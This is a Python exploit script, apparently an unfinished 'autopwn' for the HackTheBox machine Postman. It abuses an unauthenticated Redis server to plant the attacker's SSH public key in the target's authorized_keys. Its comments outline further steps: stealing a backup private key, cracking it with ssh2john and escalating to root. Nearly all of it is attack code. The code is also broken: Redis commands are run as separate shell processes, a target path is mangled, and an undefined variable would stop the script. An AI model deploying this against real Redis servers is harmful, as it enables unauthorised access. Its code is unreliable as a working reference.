#!/usr/bin/python3
# refrence - https://github.com/k4miyo/Validation-Autopwn/blob/k4miyo/validation.py
import sys, time, threading, signal, requests, string, argparse, warnings
from subprocess import *
from pwn import *

warnings.filterwarnings("ignore")

# Set handler for async events
def def_handler(sig, frame):
    print("\n[!] Quitting ...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# [DONE] 1. Redis-cli exploit
def ssh_keygen():
    try:
        # using subprocess to run bash script on python
        p1 = log.progress("generating id_rsa.pub > key.txt") 
        keygen = "(echo '\n\n'; cat /root/.ssh/id_rsa.pub; echo '\n\n') > key.txt"       
        subprocess.Popen(keygen, shell=True, stdout=subprocess.PIPE)
        p1.success("key.txt generated!")
        time.sleep(3)
        # Query the redis CLI
    except CalledProcessError as exc:
        print(exc.output)
    # key is generated on the base directory
    else:
        print("[DONE] ssh key generated on base directory ...")

# [need to rewrite with redis-cli api] 2. Sat the file contents as key in redis
def set_redis(rhost):
    try:
        # set key.txt into redis cli 
        p1 = log.progress("setting key.txt into redis-cli")
        set_sshkey = "cat key.txt | redis-cli -h %s -x set ssh_key" % (rhost)
        subprocess.Popen(set_sshkey, shell=True, stdout=subprocess.PIPE)
        p1.success("ssh key has been set!")
        time.sleep(3)

        # From hereon maybe I should be using the redis
        # config redis - login
        p2 = log.progress("configuring redis-cli")
        login = "redis-cli -h %s" % (rhost)
        subprocess.Popen(login, shell=True, stdout=subprocess.PIPE)
        p2.success("logged into redis-cli!")
        time.sleep(3)
        # config redis GET ssh_key
        p3 = log.progress("GET ssh_key")
        get_ssh_key = "GET ssh_key"
        subprocess.Popen(get_ssh_key, shell=True, stdout=subprocess.PIPE)
        p3.success("[OK] GET ssh_key")
        time.sleep(3)
        # CONFIG SET dir /var/lib/redis/.ssh
        p4 = log.progress("Setting dir /var/lib/redis/.ssh")
        set_dir = "CONFIG SET dir /dir/var/lib/redis/.ssh"
        subprocess.Popen(set_dir, shell=True, stdout=subprocess.PIPE)
        p4.success("[OK] Set dir /var/lib/redis/.ssh")
        time.sleep(3) 
        # CONFIG SET dbfilename authorized_keys
        p5 = log.progress("Setting dbfilename authorized_keys")
        set_dbfilename = "CONFIG SET dbfilename authorized_keys"
        subprocess.Popen(set_dbfilename, shell=True, stdout=subprocess.PIPE)
        p5.success("[OK] Set dbfilename authorized_keys")
        time.sleep(3)
        # Save
        p6 = log.progress("Save")
        save_redis = "save"
        subprocess.Popen(save_redis, shell=True, stdout=subprocess.PIPE)
        p6.success("[OK] save")
        time.sleep(3)
        # Exit
        p7 = log.progress("Exiting redis")
        exit_redis = "exit"
        subprocess.Popen(exit_redis, shell=True, stdout=subprocess.PIPE)
        p7.success("[OK] exit")
        time.sleep(3)
    except CalledProcessError as exc:
        print(exc.output)
    else:
        print("[DONE] SSH Key has been set in the redis cli")

# 3. ssh into the redis instance, steal the /opt/id_rsa.bak file copy internally
# 4. run ssh2john.py id_rsa.bak > hash
# 5. once the password is cracked, ssh back into the instance and su with the password

if __name__ == '__main__':
        
    parser = argparse.ArgumentParser(
        description='autopwn script for postman'
    )
    
    parser.add_argument(
    '--rhost',
    action='store',
    dest='rhost',
    help='remote ip of the HTB machine (victim)'
    )  
    
    '''
    parser.add_argument(
    '--lhost',
    action='store',
    dest='lhost',
    help='Local host ip address (attacker)'
    )  

    parser.add_argument(
    '--lport',
    action='store',
    dest='lport',
    help='Local port of the ip address (attacker)'
    )  

    # create args to be passed
    args = parser.parse_args()
    
    rhost = args.rhost
    lhost = args.lhost
    lport = args.lport
    ''' 
    rhost = args.rhost
    ssh_keygen() 
    set_redis(rhost)



